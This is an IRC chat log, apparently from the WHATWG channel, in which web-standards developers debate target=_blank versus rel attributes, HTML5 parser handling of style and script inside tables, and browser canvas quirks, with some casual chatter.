[06:54:00.0000] <hsivonen>
Moreover, over 50% of the portfolio is in the Almost Standards Mode instead of the Standards Mode

[06:54:01.0000] <hsivonen>
which demonstrates that even in the standardista circles, the status quo against which HTML5 should be measured is Transitional--not so much Strict

[06:59:00.0000] <webben>
Note that the use of transitional may reflect the inclusion of the TARGET attribute or ads.

[07:02:00.0000] <hsivonen>
webben: sure, but that makes target and ads part of the practical reality

[07:03:00.0000] <webben>
Perhaps. It depends on quite what that means.

[07:04:00.0000] <hsivonen>
ad boilerplate will come with <img border=0>, <iframe frameborder='0' width='...' height='...'> for the foreseeable future

[07:04:01.0000] <webben>
I'd say it reflects a desire to have some links open in new browsing contexts and a desire to include markup from external sources that you basically don't control.

[07:04:02.0000] <webben>
Both practices are problematic for reasons other than validation.

[07:06:00.0000] <hsivonen>
webben: yes, they are problematic, but they are also so common that seeking to make them non-conforming due to the problems would be ivory towerism

[07:06:01.0000] <webben>
(and both might have better solutions than target or using a document type that is "looser" in the future)

[07:06:02.0000] <Philip`>
<div dont-validate-since-its-not-my-content-and-i-cant-do-anything-about-it><img border=0 ...></div>

[07:07:00.0000] <webben>
Philip`: Exactly.

[07:08:00.0000] <hsivonen>
webben: when there are widely implemented interoperable solutions that pretty much work, seeking to introduce slightly better second systems is bad strategy

[07:08:01.0000] <webben>
TARGET has triggered a sort of arms race between designers and end-users. I've discussed previously in this context that user-agent behavior could be attached to REL attributes and this would cover the two common use-cases of target: opening external sites and help in new browser windows.

[07:09:00.0000] <webben>
In that context, target would mainly be a backwards compatibility measure.

[07:09:01.0000] <webben>
(and might be perfectly valid as such)

[07:09:02.0000] <webben>
I wouldn't say that invalid ad markup does "work", actually.

[07:09:03.0000] <annevk>
target could work the same as your rel proposal and in fact does already in UAs

[07:10:00.0000] <Philip`>
It would be nice if target=_blank let you set the width/height of the window, so you wouldn't have to use ugly JavaScript just for a link

[07:10:01.0000] <annevk>
hsivonen, transitional may be for layout purposes, dunno

[07:10:02.0000] <webben>
annevk: You can't configure a UA to do something different depending on what sort of link it is, AFAIK.

[07:10:03.0000] <webben>
I don't want to load external sites in a new context, but I might well want to load form help in one.

[07:10:04.0000] <hsivonen>
webben: bikeshedding the attribute name is the kind of second systemitis that has an unfavorable cost/benefit outlook

[07:11:00.0000] <webben>
I'm not sure what that means.

[07:11:01.0000] <annevk>
rel= doesn't work that way either

[07:11:02.0000] <annevk>
so i'm not sure if inventing something new is a good way to solve the problem

[07:12:00.0000] <webben>
annevk: It could do.

[07:12:01.0000] <annevk>
target= could too

[07:12:02.0000] <Philip`>
Calling it "bikeshedding" seems to be presupposing that it has an unfavourable cost/benefit outlook

[07:12:03.0000] <hsivonen>
http://en.wikipedia.org/wiki/Second-system_effect

[07:13:00.0000] <webben>
annevk: Well you could use target="help" and target="external", but then you're duplicating REL values and probably breaking target in the process.

[07:13:01.0000] <webben>
http://www.w3.org/TR/html401/types.html#type-links

[07:13:02.0000] <hsivonen>
target='_blank' is super-simple. a bunch of rel values and a full pref pane of checkboxes for them would be more complex

[07:13:03.0000] <annevk>
what hsivonen says

[07:14:00.0000] <webben>
I don't think you'd need that much user configuration, because in fact end-users generally don't want external links to open in new windows unless it would disrupt what they're doing to open in the main browsing context.

[07:15:00.0000] <hsivonen>
evidence shows that authors feel they need to open new windows

[07:15:01.0000] <hsivonen>
defaults must cater to the perceived needs of authors

[07:15:02.0000] <webben>
Yes, and will go way beyond what HTML provides in order to do so.

[07:15:03.0000] <hsivonen>
otherwise authors endeavor to defeat the defaults

[07:15:04.0000] <webben>
it's irrelevant if target is valid, since it's trivial for UAs to turn it off.

[07:16:00.0000] <webben>
so authors who really want to do so are forced into using script.

[07:16:01.0000] <hsivonen>
webben: that's the very reason why target should be valid and open new windows by default

[07:16:02.0000] <hsivonen>
webben: this way authors are lulled into the belief that they are in control but users can still easily opt for control

[07:17:00.0000] <webben>
Some stupid authors are.

[07:17:01.0000] <webben>
A lot of less stupid but equally user-hostile authors aren't.

[07:17:02.0000] <webben>
(Otherwise, there would be no arms race.)

[07:17:03.0000] <hsivonen>
by default, authors need to believe their links don't have focus rings, that they can open windows, etc.

[07:17:04.0000] <annevk>
there is no arms race

[07:18:00.0000] <annevk>
there's just an arms race with validators

[07:18:01.0000] <annevk>
the scripts that use rel=external actually insert target=_blank !

[07:18:02.0000] <hsivonen>
that's so sad

[07:18:03.0000] <webben>
Would be better done clientside.

[07:18:04.0000] <webben>
(by the client)

[07:19:00.0000] <hsivonen>
(in the way that validators aren't clearly serving authors there)

[07:19:01.0000] <webben>
I'd say it's the clients that aren't serving authors by not attaching sensible behaviours to rel.

[07:20:00.0000] <annevk>
oh please, rel is hardly used

[07:20:01.0000] <webben>
chicken egg

[07:20:02.0000] <annevk>
and underdefined except for some values

[07:20:03.0000] <annevk>
also, target=_blank works

[07:20:04.0000] <annevk>
just fine

[07:20:05.0000] <webben>
It doesn't work for all the reasons we've just discussed.

[07:20:06.0000] <hsivonen>
rel=external isn't any better than target=_blank

[07:20:07.0000] <hsivonen>
they are like <em> and <i>

[07:21:00.0000] <webben>
If I have to block target to stop external links opening in new windows but this also breaks help in forms, that's not a good outcome.

[07:21:01.0000] <hsivonen>
except rel=extarnal has a worse compat story than <em>

[07:22:00.0000] <webben>
Clearly, being able to say why a resource needs a new context rather than just randomly declaring resources need a new context is a better solution; whether it's worth the backwards compatibility friction is obviously debatable.

[07:23:00.0000] <annevk>
your solution sounds too hard for authors and users together

[07:23:01.0000] <webben>
It doesn't seem "hard" for either.

[07:23:02.0000] <webben>
target certainly is hard for both

[07:23:03.0000] <webben>
doesn't achieve what either group wants

[07:23:04.0000] <annevk>
right...

[07:24:00.0000] <hsivonen>
webben: rel=help on forms would have an awful backwards compat story

[07:24:01.0000] <webben>
hsivonen: I didn't suggest using /only/ rel="help", at least initially.

[07:25:00.0000] <hsivonen>
webben: it seems to me that the really better solution is making forms usable enough that you don't need a new window worth of help

[07:25:01.0000] <hsivonen>
webben: then there's the legalese problem

[07:25:02.0000] <webben>
hsivonen: That seems much more unrealistic.

[07:26:00.0000] <webben>
(Not least because there is no process so simple that it can't be subject to explanation, rightly or wrongly.)

[07:26:01.0000] <hsivonen>
that designers want forms to pop up legal mumbo jumbo in a new window

[07:26:02.0000] <webben>
case in point: http://windowshelp.microsoft.com/Windows/en-US/help/2e680b8d-211e-41c5-a0bf-9ccc6d7e62a21033.mspx

[07:27:00.0000] <annevk>
webben, so your believe is that you can change the mindset of all authors to start using rel values where they currently use target=_blank (or equivalent) and that users of all clients can be taught by some clever piece of navigation configuration UI?

[07:27:01.0000] <webben>
hsivonen: This is trying to argue away from the use-cases of target.

[07:27:02.0000] <annevk>
i'm so not convinced

[07:27:03.0000] <hsivonen>
webben: the Leopard box proves the problem is solvable :-)

[07:27:04.0000] <webben>
hsivonen: It does?

[07:28:00.0000] <hsivonen>
webben: the Leopard box doesn't need an opening guide because it is better designed than the Vista box

[07:29:00.0000] <hsivonen>
Web Forms 2.0 already enables form help in title=''

[07:29:01.0000] <webben>
Or just not as thoroughly documented.

[07:29:02.0000] <Philip`>
Maybe it's designed with different goals, like not needing to be protected against people walking up to big wall of DVDs in a shop and stealing the disc and license key from the box without anyone noticing

[07:29:03.0000] <hsivonen>
chances are that if you need more help than that, the design of the form sucks 

[07:30:00.0000] <webben>
TITLE is subject to all the well-rehearsed problems with TITLE.

[07:30:01.0000] <hsivonen>
yes, it is

[07:31:00.0000] <webben>
Plus I suspect that would be a lot less usable for end-users without special handling from UAs.

[07:31:01.0000] <webben>
And also, there's no way you could cram all the help required for a tax form field into TITLE.

[07:32:00.0000] <webben>
(Now tax forms are indeed too complicated, but redesigning the world's financial system seems rather out of bounds for HTML5. Government5 maybe ...)

[07:32:01.0000] <Philip`>
/me has used online application forms where it's very useful to have several paragraphs of explanatory text in popup windows, since for most fields most people will easily understand what to enter (so they don't need any explanation) but a few people will have more complex situations and will need more guidance before being able to answer

[07:33:00.0000] <webben>
So I don't see any real way out of progressive disclosure in forms.

[07:33:01.0000] <webben>
(Though there might be better ways of providing progressive disclosure, of course.)

[07:34:00.0000] <annevk>
Philip`, working on planet.html5.org, dreamhost takes quite a while to setup a subdomain though it seems :(

[07:40:00.0000] <Philip`>
/me thinks the <a ping> Referer header should be "http://www.w3.org/2008/html/ping"

[07:41:00.0000] <Philip`>
since that won't be misinterpeted as a local referrer by any site (except w3.org), and everyone loves URIs that aren't meant to be dereferenced

[07:42:00.0000] <hsivonen>
heh

[07:48:00.0000] <webben>
annevk: I think it probably wouldn't require a typical user to configure anything. Let's say UAs start opening new windows when target and rel="help" are present. Then authors who want to trigger help in a new window in forms or pages with state have an incentive to add rel="help", since the end user is more likely to see the help in the new window. In other words, I don't expect authors to change their mindset particularly, but rather to continue to do "what 

[07:49:00.0000] <hsivonen>
webben: your solution assumes that authors in general want to make it easier for users to turn off new windows of certain kinds

[07:50:00.0000] <webben>
hsivonen: Not at all. It assumes that authors in general want to make it more likely new windows will be opened.

[07:50:01.0000] <webben>
(rather than the form/state breaking or the browser throwing up some sort of notification to check the user wants to open the new window)

[07:53:00.0000] <Philip`>
The people with the strongest desire to open popup windows are those serving popup ads, so they'd probably be the first to use rel=help if it made popups less likely to be blocked

[07:53:01.0000] <webben>
(And for what it's worth, I don't think authors in /general/ are necessarily hostile to such user configuration, though some authors are I think they're a minority. Ignorance of the very possibility of user configuration is a bigger problem than hostility towards it; and hostility tends to be about pixel-perfection which isn't really a consideration here.

[07:54:00.0000] <webben>
Philip`: popup ads typically popup on a trigger other than a link being clicked.

[07:54:01.0000] <webben>
e.g. page load, mousing over the ad etc

[07:55:00.0000] <webben>
if you're going to trigger a window opening when a link is actually clicked, you might as well just send the user to the site you're advertising

[07:55:01.0000] <webben>
I think the "problem" here is more designers who stick all external links into a new window.

[07:56:00.0000] <Philip`>
Ah, so the places where rel=help would help are not places where window-opening is currently blocked?

[07:56:01.0000] <SadEagle>
well, currently link clicks would typically bypass popup blocking.

[07:56:02.0000] <webben>
popup blocking is a different issue that what happens when you click a link

[07:56:03.0000] <webben>
though some popup blockers do control target behavior as well i think

[07:57:00.0000] <webben>
*than what happens

[07:58:00.0000] <webben>
(well that's one half of the problem, the other half of the problem is user agents that can't open new windows)

[07:58:01.0000] <SadEagle>
handheld/mobile?

[08:00:00.0000] <hsivonen>
annevk: Google translator autodetects your presentation as English...

[08:00:01.0000] <webben>
kiosk, some text browsers, handhelds

[08:00:02.0000] <webben>
voice browser perhaps

[08:00:03.0000] <annevk>
hsivonen, lang= fails then :(

[08:00:04.0000] <hsivonen>
yay for metadata

[08:01:00.0000] <Dashiva>
Considering text-based IRC clients can support multiple channels, I'd expect text browsers can support multiple tabs too

[08:01:01.0000] <krijnh>
annevk: did you expect people to trip over the doctype thing yesterday? :)

[08:01:02.0000] <annevk>
hsivonen, and yay for quirky detection algorithms :p

[08:01:03.0000] <webben>
Some text browsers can. IIRC lynx can't.

[08:02:00.0000] <Dashiva>
But that's just a missing feature, not an inherent problem with text browsers

[08:02:01.0000] <SadEagle>
there are lots of things lynx can't do, though :-)

[08:02:02.0000] <zcorpan_>
annevk: what a ripoff ;)

[08:02:03.0000] <krijnh>
People were shocked to see their lovely xhtml doctype go away

[08:02:04.0000] <annevk>
zcorpan_, is that another word for "way better"?

[08:02:05.0000] <annevk>
:p

[08:02:06.0000] <webben>
SadEagle: Not many in HTML.

[08:03:00.0000] <zcorpan_>
annevk: perhaps :)

[08:03:01.0000] <zcorpan_>
annevk: did you get any interesting questions?

[08:04:00.0000] <annevk>
there were lots of questions throughout the presentation about details of how things work

[08:04:01.0000] <annevk>
<input type=file> support for multiple files came up again

[08:04:02.0000] <annevk>
people want that badly it seems

[08:04:03.0000] <zcorpan_>
interesting

[08:05:00.0000] <annevk>
question about server-sent events and a better version of HTTP because HTTP is not that fit for it currently

[08:05:01.0000] <annevk>
(max nr of connections, etc.)

[08:10:00.0000] <annevk>
krijnh, they didn't really trip, did they?

[08:10:01.0000] <hsivonen>
is the max # connections thing even useful anymore? is it there just because it has always been there?

[08:10:02.0000] <annevk>
it's useful for servers

[08:11:00.0000] <krijnh>
annevk: nah, not really

[08:11:01.0000] <annevk>
i believe, because it makes it harder to DOS them

[08:11:02.0000] <hsivonen>
annevk: it seems to me it is the author side that wants to work around the limit, though

[08:12:00.0000] <annevk>
yeah, doesn't necessarily mean servers are ready i guess

[08:13:00.0000] <annevk>
but i don't know too much about it, i hope other people will solve it...

[08:13:01.0000] <annevk>
for server-sent events it's pretty easy to work around using access control and several subdomains...

[08:15:00.0000] <webben>
Dashiva: Maybe it's a missing feature, yes. Not entirely sure whether the Lynx devs would regard it as such or not.

[08:18:00.0000] <jwalden>
"I love the irony of the fact that we just renamed _global_ storage to _local_ storage without changing anything of the semantics..."

[08:18:01.0000] <Philip`>
If you want multiple Lynx windows, just run them inside screen

[08:18:02.0000] <webben>
/me can't find any discussion of it on the lynx-dev windows.

[08:19:00.0000] <webben>
*lynx-dev mailing list

[08:20:00.0000] <webben>
except this discussion of JS where a user discusses preventing new windows opened by JS: http://lists.gnu.org/archive/html/lynx-dev/2002-03/msg00028.html

[08:20:01.0000] <webben>
(in iCab)

[08:22:00.0000] <Dashiva>
Well, as long as they don't try to force their one-window approach on the rest of the web, they're free to do whatever they want :)

[08:26:00.0000] <annevk>
http://planet.html5.org/

[08:27:00.0000] <Philip`>
annevk: Thanks :-)

[08:27:01.0000] <Philip`>
(Doesn't actually work since my DNS has updated yet, though...)

[08:27:02.0000] <Philip`>
s/has/hasn't/

[08:30:00.0000] <Philip`>
/me still wonders if he's missing some point for http://krijnhoetmer.nl/irc-logs/whatwg/20080208#l-522

[08:33:00.0000] <annevk>
i'm not sure why html5lib does that, but it does seem the most useful solution given <style scoped>

[08:34:00.0000] <zcorpan_>
ie and opera keep the style in table. mozilla moves it outside. webkit moves it to head.

[08:36:00.0000] <krijnh>
annevk: heb je msn in de buurt?

[08:36:01.0000] <annevk>
pidgin

[08:36:02.0000] <zcorpan_>
/me also notes that <table><style scoped> could be useful for column alignment when someone invents a working css solution for that

[08:37:00.0000] <Philip`>
<table><script> has the same issue in html5lib/validator.nu

[08:38:00.0000] <zcorpan_>
i think scripts need to work in tables given document.write and roundtripping

[08:39:00.0000] <Philip`>
but I can't find any other elements that do that

[08:39:01.0000] <annevk>
i'd expect <title> once we remove the crazy behavior HTML5 specifies for it now

[08:39:02.0000] <Philip`>
and unless I'm being stupid, style and script fall into the "in table -> anything else" case and should get foster-parented instead of being added to the current (table) node

[08:40:00.0000] <annevk>
you're right

[08:40:01.0000] <zcorpan_>
who's gonna send email?

[08:40:02.0000] <annevk>
i think the way validator.nu and html5lib implement <style> and <script> gives you this behavior instead of what HTML5 defines

[08:41:00.0000] <zcorpan_>
/me sends email

[08:41:01.0000] <annevk>
zcorpan_, seems you're volunteering

[08:41:02.0000] <annevk>
right

[08:41:03.0000] <annevk>
:p

[08:41:04.0000] <Philip`>
Why don't they do <textarea> the same as <style>/etc?

[08:41:05.0000] <annevk>
<style>/<script> are handled together inhead or so

[08:42:00.0000] <annevk>
now you're making me check :(

[08:42:01.0000] <Philip`>
Oh, they get handled by jumping through the "in head" state...

[08:43:00.0000] <annevk>
yeah

[08:43:01.0000] <annevk>
and we're using this appendToHead method that does things wrongly in face of <table>

[08:44:00.0000] <annevk>
(or maybe not)

[08:45:00.0000] <annevk>
'self.parser.parseError("two-heads-are-not-better-than-one")' :-)

[08:59:00.0000] <zcorpan_>
annevk: http://simon.html5.org/presentations/ now has some plain text link love

[09:07:00.0000] <annevk>
Philip`, you missed <base>, <link>, and <meta>

[09:09:00.0000] <annevk>
Firefox behavior for those is weird

[09:09:01.0000] <Philip`>
zcorpan_: I don't think your comment about <table><script>document.write(rows)</script></table> is right - regardless of where the script element is added to the DOM, document.write will add characters to the input stream just after the </script> and hence in the "in table" mode

[09:10:00.0000] <jwalden>
I fail at life

[09:10:01.0000] <jwalden>
somehow I always manage to forget to add +whatwg to my posts

[09:10:02.0000] <jwalden>
so I get "held for moderation" delays

[09:11:00.0000] <Philip`>
Those delays are infinite

[09:11:01.0000] <jwalden>
sigh

[09:11:02.0000] <jwalden>
so I get to spam the non-whatwg receivers with a second copy :-\

[09:12:00.0000] <gsnedders>
jwalden: Resent-To!

[09:12:01.0000] <gsnedders>
jwalden: don't totally resend it :P

[09:12:02.0000] <jwalden>
yes, I send my resent to the moderation feature of the list

[09:14:00.0000] <jwalden>
/me doesn't see a way to do that in Thunderbird

[09:14:01.0000] <jwalden>
/me wonders just how many muas actually make doing that easy

[09:15:00.0000] <annevk>
it will take people a split-second to recognize dupes

[09:15:01.0000] <jwalden>
/me does things the easy way

[09:15:02.0000] <annevk>
don't worry about it

[09:34:00.0000] <zcorpan_>
hsivonen: in order to avoid angry users who don't read the about page, perhaps the "valid" message should say that the result might change over time? (i don't know if you've had angry users, perhaps you're being clear enough about it)

[09:35:00.0000] <zcorpan_>
(the message in the html5 interface is clear but in the generic interface less so)

[11:08:00.0000] <RockinRoel>
hello

[11:17:00.0000] <annevk>
hi

[11:19:00.0000] <RockinRoel>
I read something in the logs about CanvasRenderingContext2D.prototype not working in Safari

[11:22:00.0000] <annevk>
dunno about that

[11:24:00.0000] <DxSadEagle>
may be look at Philip`'s test reports?

[11:24:01.0000] <RockinRoel>
/me I find it sort of annoying that I can't do:

[11:25:00.0000] <RockinRoel>
CanvasRenderingContext2D.prototype.newFunction() = function() { etc�

[11:25:01.0000] <DxSadEagle>
get a context object, and access it's __proto__

[11:26:00.0000] <RockinRoel>
does __proto__ work on Safari?

[11:26:01.0000] <RockinRoel>
I heard that it did on Firefox, but not Safari

[11:26:02.0000] <DxSadEagle>
it does.

[11:27:00.0000] <RockinRoel>
cool. is this a Safari bug actually?

[11:27:01.0000] <DxSadEagle>
It is a non-standard mozilla extension, but JSC supports it. I think Opera doesn't. 

[11:27:02.0000] <DxSadEagle>
Depends on your definition of bug and your reading of not-yet-finished ECMA-bindings-for-DOM document.

[11:28:00.0000] <RockinRoel>
well, I thought that every javascript object needed to have a prototype

[11:28:01.0000] <RockinRoel>
by definition

[11:29:00.0000] <RockinRoel>
I'll check it out

[11:29:01.0000] <DxSadEagle>
What makes you think it should be visible in this way?

[11:29:02.0000] <RockinRoel>
I'm sorry, I don't understand that

[11:30:00.0000] <DxSadEagle>
CanvasRenderingContext2D isn't even a constructor, so the convention about constructor's .prototype pointing to the prototype of constructed objects doesn't even apply.

[11:33:00.0000] <RockinRoel>
yet every browser assumes that CanvasRenderingContext2D is an object, except Safari?

[11:34:00.0000] <DxSadEagle>
What does it being an object have to do with anything? And it's specified as an -interface-.

[11:35:00.0000] <RockinRoel>
yes, sorry, I haven't quite gotten the hang of "advanced" javascript yet

[11:36:00.0000] <DxSadEagle>
anyway, just try __proto__. I am not sure they didn't laze out and put stuff straight on the object, but this is all a side conversation.

[12:08:00.0000] <Philip`>
http://philip.html5.org/tests/canvas/suite/tests/results.html#2d.type.extend

[12:08:01.0000] <Philip`>
Safari fails because window.CanvasRenderingContext2D doesn't exist

[12:09:00.0000] <Philip`>
(which I'm considering a bug, though I don't know what spec justifies that)

[12:16:00.0000] <DxSadEagle>
Philip`: I think ECMA bindings-for-DOM will eventually justify that

[12:32:00.0000] <annevk>
http://weblogs.mozillazine.org/roc/archives/2008/02/the_best_of_int.html (people asking for a sane version of SVG)

[12:42:00.0000] <hsivonen>
hmm. why do html5lib and Validator.nu interoperate against the spec in the <table><style> case? did the spec change after the summer or something?

[12:45:00.0000] <hsivonen>
zcorpan: Given current user reactions, the "Highly Experimental" bit in the HTML5 facet may even suggest that the service is less ready for action than it actually is.

[12:46:00.0000] <hsivonen>
zcorpan: So far I haven't had users complain about schema changes.

[12:47:00.0000] <annevk>
hsivonen, I think we share an implementation detail

[12:47:01.0000] <hsivonen>
that's odd

[12:48:00.0000] <annevk>
where can you see the output of Validator.nu?

[12:48:01.0000] <hsivonen>
parsetree.validator.nu

[12:48:02.0000] <hsivonen>
http://parsetree.validator.nu/?doc=http://philip.html5.org/misc/style-in-table.html

[12:49:00.0000] <annevk>
I wanted to test <table><base> but this makes that harder

[12:50:00.0000] <hsivonen>
yeah, parsetree.v.nu UI sucks. it is a quick and dirty hack

[12:51:00.0000] <annevk>
actually, why does everyone suggest this is something weird in HTML5?

[12:51:01.0000] <annevk>
hmm

[12:52:00.0000] <hsivonen>
                case IN_BODY:

[12:52:01.0000] <hsivonen>
                    } else if ("base" == name || "link" == name || "meta" == name

[12:52:02.0000] <hsivonen>
                            || "style" == name || "script" == name) {

[12:52:03.0000] <hsivonen>
                        // Fall through to IN_HEAD

[12:52:04.0000] <Philip`>
That sounds like what the spec says to do

[12:53:00.0000] <annevk>
the spec also suggests to append <style> and <script> etc. to the current node

[12:53:01.0000] <annevk>
which is <table> and not the foster parent afaict

[12:53:02.0000] <Philip`>
The in-table bit says that when you would normally append to the current node, you actually append to the foster parent instead

[12:54:00.0000] <hsivonen>
Philip`: except the foster parenting exception is only implemented IN_BODY, so stuff that falls through to IN_HEAD isn't affected

[12:54:01.0000] <Philip`>
so that should happen regardless of the route you take before trying to append to the current node

[12:54:02.0000] <Philip`>
hsivonen: Ah, okay

[12:55:00.0000] <hsivonen>
hmm. I did implement forster parenting for <base>

[12:55:01.0000] <hsivonen>
hmm.

[12:55:02.0000] <hsivonen>
I suppose I should change appendToCurrentNodeAndPushElement to appendToCurrentNodeAndPushElementMayFoster even IN_HEAD if the spec stays the way it is

[12:56:00.0000] <annevk>
the current spec shouldn't stay the way it is

[12:56:01.0000] <Philip`>
Why change in IN_HEAD rather than changing it globally?

[12:56:02.0000] <hsivonen>
(from my method naming you can probably tell that I'm using IDE autocomplete :-)

[12:56:03.0000] <Philip`>
It only takes one boolean variable test per call to work out whether the special case applies

[12:56:04.0000] <Philip`>
which shouldn't be at all expensive

[12:57:00.0000] <annevk>
oh well, thanks to Philip` we uncover some more spec bugs :)

[12:58:00.0000] <hsivonen>
Philip`: it's not a boolean on the runtime stack, so presumably one wouldn't want to poke the heap without reason

[12:59:00.0000] <hsivonen>
I don't remember if calling the MayFoster variants from outside IN_BODY has any ill effects beyond extra memory access, though

[12:59:01.0000] <Philip`>
/me really hopes you can't get the append-to-current-node-but-actually-append-to-foster-parent-instead thing inside the adoption agency algorithm

[13:04:00.0000] <hsivonen>
gotta love other people's source: the XML parser I use has and unhandled case when a CDATA section end aligns across a read buffer boundary

[13:05:00.0000] <hsivonen>
of course someone tried to validate a page where the ]]> fell across the read buffer boundary...

[13:11:00.0000] <Hixie>
annevk: html, html+, html2, html 3.2, html4, html5. it's the fifth major revision.

[13:12:00.0000] <annevk>
Y! rejected the MS bid

[13:12:01.0000] <annevk>
/me didn't know

[13:12:02.0000] <gsnedders>
In need of a shorter to-do list.

[13:12:03.0000] <hsivonen>
annevk: URL?

[13:12:04.0000] <gsnedders>
/me is in need of a shorter to-do list (that makes more sense).

[13:12:05.0000] <hsivonen>
and I just got around to writing a Flickr backup utility

[13:12:06.0000] <annevk>
found through news.google.com: http://afp.google.com/article/ALeqM5hm0kvkhjrjiA4hTdisbB5PYpTTlg

[13:13:00.0000] <hsivonen>
annevk: thanks

[13:13:01.0000] <annevk>
also: http://news.google.com/?ncl=1130039008

[13:15:00.0000] <Philip`>
gsnedders: Put deadlines on all the tasks in your list, and then don't work on them, and once they've passed their deadlines and the world hasn't ended you can assume that they're obviously not really that important and you can just delete them from the list

[13:15:01.0000] <gsnedders>
Philip`: So no http-parsing spec or spec-gen clone, then

[13:17:00.0000] <Philip`>
Hmm, it's harder if the things on your list are things you actually want to do

[13:17:01.0000] <gsnedders>
Philip`: yeah, that's the issue for most

[13:17:02.0000] <gsnedders>
it's not really the length: the issue is that what I put on it and don't deal with straight away takes _ages_ to deal with, so even having c. 20 items on it is enough to last months.

[13:18:00.0000] <gsnedders>
Philip`: one of the things has sorted itself out by the emailing just bouncing, so I can't deal with it :P

[13:20:00.0000] <annevk>
oh, more good news, the writers strike might finally be over

[13:24:00.0000] <gsnedders>
/me almosts asks a question about XMLHttpRequest, then realises the answer is two lines above where he was reading

[13:31:00.0000] <gsnedders>
annevk: do current implementations return the correct ExceptionCode?

[13:32:00.0000] <annevk>
prolly not

[13:35:00.0000] <gsnedders>
/me wishes there was a better way that wasn't impl specific to test HTTP parsing

[13:37:00.0000] <Philip`>
Is the XHR HTTP parser always the same as the normal HTTP parser?

[13:37:01.0000] <gsnedders>
Philip`: in the case of IE, Fx, Saf/Mac (and I think win too), and Opera yes

[13:37:02.0000] <Philip`>
(and not e.g. something that gets handed a single string of headers from the network code, and splits it into key:value lines itself)

[13:38:00.0000] <Philip`>
Ah, okay, that sounds alright then

[13:39:00.0000] <gsnedders>
/me wonders how to test non-strict server-side parsers

[13:39:01.0000] <gsnedders>
strict request parsers on servers are easy to test: you just check you get 400 back :P

[13:40:00.0000] <Philip`>
/me likes how the multipage HTML5 spec is nearly XML, so you can just fix a few bits in the header and then use a standard XML parser

[13:41:00.0000] <annevk>
Philip`, the solution is to make an HTML5 parser that is faster than an XML parser

[13:41:01.0000] <gsnedders>
(FWIW: the current intention is to say: "This specification RECOMMENDS using a non-strict parser for parsing responses, and a strict parser for parsing request.")

[13:42:00.0000] <Philip`>
annevk: The problem is that I'm parsing the HTML5 spec in order to create an HTML5 parser - I wouldn't have to do this if there was an HTML5 parser already :-p

[13:42:01.0000] <Philip`>
(*if there was an HTML5 parser in Perl already)

[13:43:00.0000] <annevk>
dogfood :p

[13:44:00.0000] <Philip`>
Chicken/egg

[13:44:01.0000] <Philip`>
so it's more like fox food than dog food

[13:45:00.0000] <gsnedders>
Philip`: egg.

[13:45:01.0000] <annevk>
hmm, http://habrahabr.ru/blog/webstandards/28107.html

[13:48:00.0000] <DxSadEagle>
annevk: I could spot-translate stuff if you care, though the markup should be mostly self-explanatory

[13:49:00.0000] <annevk>
yeah, he translated my article, I'm mostly interested in the comments :)

[13:49:01.0000] <virtuelv_>
Google translate has become quite good at russian-english

[13:49:02.0000] <annevk>
if there are interesting comments that would be nice to know

[13:50:00.0000] <annevk>
/me tries

[13:50:01.0000] <DxSadEagle>
There is a bug report about input events lacking the last letter :-)

[13:50:02.0000] <virtuelv_>
http://www.google.com/translate?u=http%3A%2F%2Fhabrahabr.ru%2Fblog%2Fwebstandards%2F28107.html&langpair=ru%7Cen&hl=en&ie=UTF8 fwiw

[13:51:00.0000] <virtuelv_>
the comments mostly seem to be a giant flamewar :)

[13:51:01.0000] <DxSadEagle>
/me looks for laughs

[13:52:00.0000] <virtuelv_>
and people thinking annevk is a girl :P

[13:53:00.0000] <annevk>
even in Russia, crap :)

[13:54:00.0000] <gsnedders>
annevk: is male? oh.

[13:54:01.0000] <gsnedders>
:P

[13:54:02.0000] <annevk>
hehe, someone posted a photo to show otherwise

[13:54:03.0000] <gsnedders>
</sarcasm>

[13:54:04.0000] <Philip`>
annevk: The cowpath is clear, so you should just pave it

[13:54:05.0000] <DxSadEagle>
yeah, plus dispute on what exactly google suggest means, and complaints about xhtml2 non-support(?) in Opera.  So yes, the oninput bug report is the most relevant part :-)

[13:55:00.0000] <DxSadEagle>
/me laughs at the translation.

[13:57:00.0000] <DxSadEagle>
virtuelv_: It translates a 'heck' exclamation (which is more like 'crap', etc. in meaning) as features :p

[13:59:00.0000] <virtuelv_>
DxSadEagle: there's also this: http://google.com/translate_t?hl=en&ie=UTF8&text=Retrieved&langpair=en%7Cde

[14:00:00.0000] <annevk>
i think we fixed the oninput thingie

[14:00:01.0000] <DxSadEagle>
/me tries babelfish/systran, for comparison

[14:01:00.0000] <Philip`>
Google Translate seems slightly more open to abuse than other translation services

[14:02:00.0000] <DxSadEagle>
heh. "Error decoding translated text."

[14:02:01.0000] <Philip`>
http://www.news.com/8301-13577_3-9857280-36.html

[14:18:00.0000] <Philip`>
http://james.html5.org/cgi-bin/parsetree/parsetree.py?uri=http://philip.html5.org/misc/fostered-adoption.html vs http://parsetree.validator.nu/?doc=http://philip.html5.org/misc/fostered-adoption.html

[14:19:00.0000] <Philip`>
They disagree in the number of parse errors

[14:19:01.0000] <Philip`>
I'm not sure if they're correct according to the spec or not...

[14:28:00.0000] <hsivonen>
Philip`: yeah, disagreeing on the exact number of tree construction errors is a known thing when # of errors > 0

[14:30:00.0000] <Philip`>
http://philip.html5.org/misc/fostered-select.html

[14:30:01.0000] <Philip`>
HTML5 and html5lib and Validator.nu disagree with all browsers

[14:32:00.0000] <Philip`>
/me would quite like a graph of mode transitions

[14:33:00.0000] <Dashiva>
Didn't someone make that a few months ago?

[14:34:00.0000] <annevk>
not for the parser

[14:34:01.0000] <Philip`>
http://canvex.lazyilluminati.com/misc/tokeniser_states.png ?

[14:35:00.0000] <Philip`>
That's only tokeniser

[14:37:00.0000] <Dashiva>
The parser text is too unstructured to generate from?

[14:37:01.0000] <gsnedders>
/me bursts out laughing at Philip` suggesting annevk should pave the cowpath (regarding being a woman)

[14:39:00.0000] <Dashiva>
/me wonders which the photo posted "to show otherwise" was supposed to support

[14:39:01.0000] <Dashiva>
*which gender

[14:39:02.0000] <Philip`>
Dashiva: I've already solved that structure problem, by writing a Perl script to translate the HTML/English into OCaml :-)

[14:39:03.0000] <Dashiva>
So we'll have a parser graph by tomorrow then? 

[14:40:00.0000] <Philip`>
Hopefully sooner than that

[14:41:00.0000] <Philip`>
...if I can work out how to write to files

[14:42:00.0000] <gsnedders>
/me needs to choose between chemistry and psychology for the final year of school

[14:42:01.0000] <Dashiva>
They're basically the same thing

[14:43:00.0000] <Dashiva>
Just a question of where you want your chemical reactions to be taking place

[14:43:01.0000] <gsnedders>
And in what way you study the affects of them :)

[14:43:02.0000] <Philip`>
Does psychology involve some kind of science?

